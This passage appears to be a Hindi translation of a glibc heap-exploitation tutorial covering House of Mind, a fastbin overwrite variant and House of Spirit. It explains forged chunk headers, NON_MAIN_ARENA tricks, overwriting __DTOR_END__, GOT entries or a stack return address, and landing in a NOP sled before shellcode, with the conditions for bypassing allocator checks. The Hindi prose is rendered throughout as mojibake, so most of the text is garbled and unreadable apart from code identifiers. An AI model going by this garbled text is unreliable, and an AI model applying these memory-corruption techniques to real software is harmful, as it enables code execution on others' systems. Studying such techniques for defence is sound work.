‡§ú‡§ø‡§∏ ‡§™‡§§‡•á ‡§™‡§∞ ‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§™‡§§‡§æ ‡§ó‡§ø‡§∞‡§§‡§æ ‡§π‡•à, ‡§â‡§∏‡§ï‡•á ‡§Ö‡§Ç‡§§‡§ø‡§Æ 5 ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§ï‡•á ‡§∏‡§æ‡§• ‡§π‡§Æ‡•á‡§Ç ‡§™‡§π‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ø‡§ñ‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§§‡§æ‡§ï‡§ø heap\_for\_ptr() ‡§Ø‡§π ‡§∏‡•ã‡§ö ‡§∏‡§ï‡•á ‡§ï‡§ø ar\_ptr ‡§™‡§π‡§≤‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•Ä ‡§∂‡•Å‡§∞‡•Å‡§Ü‡§§ ‡§Æ‡•á‡§Ç ‡§π‡•à ‡§î‡§∞ ‡§µ‡§π‡§æ‡§Ç ‡§∏‡•á av->bins\[2] ‡§®‡§ø‡§ï‡§æ‡§≤‡•á‡•§

‡§¶‡•Ç‡§∏‡§∞‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§î‡§∞ ‡§™‡§π‡§≤‡•á ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£, ‡§π‡§Æ prev\_size ‡§ï‡•ã 0x0c ‡§ï‡•á ‡§∏‡§æ‡§• ‡§î‡§∞ size ‡§ï‡•ã ‡§ï‡•Å‡§õ ‡§ê‡§∏‡§æ ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã -> NON\_MAIN\_ARENA ‡§ï‡•ã ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§ü‡•Å‡§ï‡§°‡§º‡§æ 2 ‡§Æ‡•á‡§Ç ‡§π‡§Æ ‡§¨‡§π‡•Å‡§§ ‡§∏‡§æ‡§∞‡•á nops ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ ‡§Ö‡§Ç‡§§ ‡§Æ‡•á‡§Ç ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, \_int\_free(TROZO1, TROZO2) ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡•ã‡§Ç ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡•á‡§ó‡§æ ‡§§‡§æ‡§ï‡§ø __DTOR\_END\_ ‡§Æ‡•á‡§Ç prev\_size ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•ã ‡§≤‡§ø‡§ñ‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á, ‡§ú‡•ã ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§™‡§∞ ‡§ï‡•Ç‡§¶ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§á‡§∏ ‡§§‡§ï‡§®‡•Ä‡§ï ‡§ï‡•ã ‡§≤‡§æ‡§ó‡•Ç ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•Å‡§õ ‡§î‡§∞ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ‡§è‡§Å ‡§™‡•Ç‡§∞‡•Ä ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è ‡§ú‡•ã ‡§™‡•á‡§≤‡•ã‡§° ‡§ï‡•ã ‡§•‡•ã‡§°‡§º‡§æ ‡§î‡§∞ ‡§ú‡§ü‡§ø‡§≤ ‡§¨‡§®‡§æ‡§§‡•Ä ‡§π‡•à‡§Ç‡•§

‡§Ø‡§π ‡§§‡§ï‡§®‡•Ä‡§ï ‡§Ö‡§¨ ‡§≤‡§æ‡§ó‡•Ç ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø unlink ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡§ó‡§≠‡§ó ‡§µ‡§π‡•Ä ‡§™‡•à‡§ö ‡§≤‡§æ‡§ó‡•Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ‡•§ ‡§Ø‡§π ‡§ú‡§æ‡§Ç‡§ö‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§ú‡§ø‡§∏ ‡§®‡§è ‡§∏‡•ç‡§•‡§æ‡§® ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§ï‡•ç‡§Ø‡§æ ‡§µ‡§π ‡§≠‡•Ä ‡§â‡§∏‡•Ä ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à‡•§

**‡§´‡§æ‡§∏‡•ç‡§ü‡§¨‡§ø‡§®**

‡§Ø‡§π ‡§¶ ‡§π‡§æ‡§â‡§∏ ‡§ë‡§´ ‡§Æ‡§æ‡§á‡§Ç‡§° ‡§ï‡§æ ‡§è‡§ï ‡§∞‡•Ç‡§™‡§æ‡§Ç‡§§‡§∞ ‡§π‡•à‡•§

‡§π‡§Æ‡•á‡§Ç ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∞‡•Å‡§ö‡§ø ‡§π‡•à, ‡§ú‡§ø‡§∏‡•á \_int\_free() ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•Ä ‡§™‡§π‡§≤‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§™‡§π‡•Å‡§Å‡§ö‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à:

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§Ø‡§¶‡§ø ‚Äúfb‚Äù ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á GOT ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§™‡§§‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏ ‡§™‡§§‡•á ‡§™‡§∞ ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§ ‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§è‡§∞‡•á‡§®‡§æ dtors ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•á ‡§ï‡§∞‡•Ä‡§¨ ‡§π‡•ã‡•§ ‡§Ö‡§ß‡§ø‡§ï ‡§∏‡§ü‡•Ä‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á, av->max\_fast ‡§â‡§∏ ‡§™‡§§‡•á ‡§™‡§∞ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ú‡§æ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç‡•§

‡§ö‡•Ç‡§Ç‡§ï‡§ø ‡§¶ ‡§π‡§æ‡§â‡§∏ ‡§ë‡§´ ‡§Æ‡§æ‡§á‡§Ç‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Ø‡§π ‡§¶‡•á‡§ñ‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ ‡§ï‡§ø ‡§π‡§Æ av ‡§ï‡•á ‡§∏‡•ç‡§•‡§æ‡§® ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§§‡•ã ‡§Ø‡§¶‡§ø size ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§Æ‡•á‡§Ç 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‡§°‡§æ‡§≤‡§§‡•á ‡§π‡•à‡§Ç ‚Äî> fastbin\_index() ‡§π‡§Æ‡•á‡§Ç fastbins\[-1] ‡§≤‡•å‡§ü‡§æ‡§è‡§ó‡§æ, ‡§ú‡•ã av->max\_fast ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡•á‡§ó‡§æ‡•§

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç av->max\_fast ‡§µ‡§π ‡§™‡§§‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ú‡§ø‡§∏‡•á ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ (‡§® ‡§ï‡§ø ‡§ú‡§ø‡§∏ ‡§™‡§∞ ‡§Ø‡§π ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§¨‡§≤‡•ç‡§ï‡§ø ‡§µ‡§π ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§ú‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡•Ä ‡§ú‡§æ‡§è‡§ó‡•Ä)‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á ‡§¨‡§ó‡§≤ ‡§ï‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ 8 ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§π‡•ã -> ‡§ö‡•Ç‡§Ç‡§ï‡§ø ‡§π‡§Æ‡§®‡•á ‡§ï‡§π‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ 8 ‡§π‡•à, ‡§á‡§∏ ‡§ù‡•Ç‡§†‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§ï‡•á‡§µ‡§≤ 8 ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§Ü‡§ï‡§æ‡§∞ ‡§°‡§æ‡§≤‡§®‡§æ ‡§π‡•ã‡§ó‡§æ (‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§™‡§π‡§≤‡•á ‡§è‡§ï jmp ‡§°‡§æ‡§≤‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ú‡•ã nops ‡§Æ‡•á‡§Ç ‡§ó‡§ø‡§∞‡§§‡§æ ‡§π‡•à)‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§â‡§∏‡•Ä ‡§ù‡•Ç‡§†‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•ã av->system\_mem ‡§∏‡•á ‡§õ‡•ã‡§ü‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ av->system\_mem 1848 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§Ü‡§ó‡•á ‡§π‡•à‡•§

__DTOR\_END\_ ‡§ï‡•á ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§î‡§∞ GOT ‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ ‡§™‡§§‡•á ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£, ‡§á‡§® ‡§ñ‡§Ç‡§°‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•Å‡§ï‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§ö‡§≤‡§ø‡§è ‡§¶‡•á‡§ñ‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§∏‡•ç‡§ü‡•à‡§ï ‡§™‡§∞ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§´‡§æ‡§∏‡•ç‡§ü‡§¨‡§ø‡§® ‡§ï‡•ã ‡§ï‡•à‡§∏‡•á ‡§≤‡§æ‡§ó‡•Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡•§

‡§π‡§Æ‡§≤‡•á ‡§ï‡§æ ‡§è‡§ï ‡§î‡§∞ ‡§§‡§∞‡•Ä‡§ï‡§æ **av** ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•Ä ‡§ì‡§∞ ‡§™‡•Å‡§®‡§∞‡•ç‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§π‡•à‡•§

‡§Ø‡§¶‡§ø ‡§π‡§Æ size ‡§ï‡•ã 8 ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø 16 ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã: fastbin\_index() ‡§π‡§Æ‡•á‡§Ç fastbins\[0] ‡§≤‡•å‡§ü‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§π‡§Æ ‡§á‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•ã‡§à ‡§ï‡•à‡§®‡§∞‡•Ä ‡§Ø‡§æ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§Ö‡§ú‡•Ä‡§¨ ‡§Æ‡§æ‡§® ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡•á‡§Ç ‡§á‡§∏ ‡§™‡§∞ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è: 4 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§∂‡•Ç‡§®‡•ç‡§Ø + EBP + RET

4 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø **av** ‡§á‡§∏ ‡§™‡§§‡•á ‡§™‡§∞ ‡§π‡•ã ‡§î‡§∞ **av** ‡§ï‡§æ ‡§™‡§π‡§≤‡§æ ‡§§‡§§‡•ç‡§µ ‡§µ‡§π ‡§Æ‡•ç‡§Ø‡•Ç‡§ü‡•á‡§ï‡•ç‡§∏ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§Æ‡§æ‡§® 0 ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

**av->max\_fast** EBP ‡§π‡•ã‡§ó‡§æ ‡§î‡§∞ ‡§Ø‡§π ‡§è‡§ï ‡§Æ‡§æ‡§® ‡§π‡•ã‡§ó‡§æ ‡§ú‡•ã ‡§π‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§§‡§ø‡§¨‡§Ç‡§ß‡•ã‡§Ç ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§ï‡§∞‡•á‡§ó‡§æ‡•§

**av->fastbins\[0]** ‡§ï‡•ã **p** ‡§ï‡•á ‡§™‡§§‡•á ‡§∏‡•á ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§î‡§∞ ‡§Ø‡§π RET ‡§π‡•ã‡§ó‡§æ, ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§Ø‡§π ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§™‡§∞ ‡§ï‡•Ç‡§¶ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, **av->system\_mem** (‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§ø‡§§‡§ø ‡§∏‡•á 1484 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ ‡§ä‡§™‡§∞) ‡§Æ‡•á‡§Ç ‡§¨‡§π‡•Å‡§§ ‡§∏‡§æ‡§∞‡•Ä ‡§¨‡§ï‡§µ‡§æ‡§∏ ‡§π‡•ã‡§ó‡•Ä ‡§ú‡•ã ‡§π‡§Æ‡•á‡§Ç ‡§ï‡•Ä ‡§ó‡§à ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§ó‡•Ä‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á ‡§¨‡§ó‡§≤ ‡§ï‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ 8 ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§π‡•ã -> ‡§ö‡•Ç‡§Ç‡§ï‡§ø ‡§π‡§Æ‡§®‡•á ‡§ï‡§π‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ 16 ‡§π‡•à, ‡§á‡§∏ ‡§ù‡•Ç‡§†‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§ï‡•á‡§µ‡§≤ 8 ‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§Ü‡§ï‡§æ‡§∞ ‡§°‡§æ‡§≤‡§®‡§æ ‡§π‡•ã‡§ó‡§æ (‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§™‡§π‡§≤‡•á ‡§è‡§ï jmp ‡§°‡§æ‡§≤‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ú‡•ã nops ‡§Æ‡•á‡§Ç ‡§ó‡§ø‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§®‡§è ‡§ù‡•Ç‡§†‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á size ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§Ü‡§§‡•á ‡§π‡•à‡§Ç)‡•§

**‡§¶ ‡§π‡§æ‡§â‡§∏ ‡§ë‡§´ ‡§∏‡•ç‡§™‡§ø‡§∞‡§ø‡§ü**

‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ‡§π‡§Æ ‡§è‡§ï ‡§ê‡§∏‡•á malloc ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á (‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡•á ‡§®‡•Ä‡§ö‡•á ‡§π‡•ã)‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§π‡§Æ ‡§á‡§∏ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§ï‡§π‡•Ä‡§Ç ‡§≠‡•Ä ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§∏‡•ç‡§•‡§æ‡§® ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à, ‡§ù‡•Ç‡§†‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ av->max\_fast ‡§∏‡•á ‡§õ‡•ã‡§ü‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§î‡§∞ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§≠‡§µ‡§ø‡§∑‡•ç‡§Ø ‡§Æ‡•á‡§Ç malloc() ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß‡§ø‡§§ ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§¨‡§∞‡§æ‡§¨‡§∞ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è +8‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§π‡§Æ ‡§ú‡§æ‡§®‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§á‡§∏ ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•á ‡§¨‡§æ‡§¶ malloc(40) ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§§‡•ã ‡§ù‡•Ç‡§†‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ 48 ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§

‡§Ø‡§¶‡§ø ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§∏‡•á ‡§è‡§ï ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§™‡•Ç‡§õ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§π‡§Æ 48 ‡§¶‡§∞‡•ç‡§ú ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ malloc ‡§ï‡•á ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§Ö‡§ó‡§≤‡•á 4 ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏ (‡§ú‡•ã ‡§≠‡§æ‡§ó‡•ç‡§Ø ‡§∏‡•á EBP ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§π‡•ã ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§á‡§∏‡§≤‡§ø‡§è 48 ‡§™‡•Ä‡§õ‡•á ‡§∞‡§π ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§Ø‡§π ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡§æ ‡§π‡•á‡§°‡§∞ ‡§π‡•ã) ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§™‡§§‡§æ ptr-4+48 ‡§ï‡•ã ‡§ï‡§à ‡§∂‡§∞‡•ç‡§§‡•ã‡§Ç ‡§ï‡•ã ‡§™‡•Ç‡§∞‡§æ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è (‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ptr=EBP), ‡§Ö‡§∞‡•ç‡§•‡§æ‡§§‡•ç, 8 < ptr-4+48 < av->system\_mem‡•§

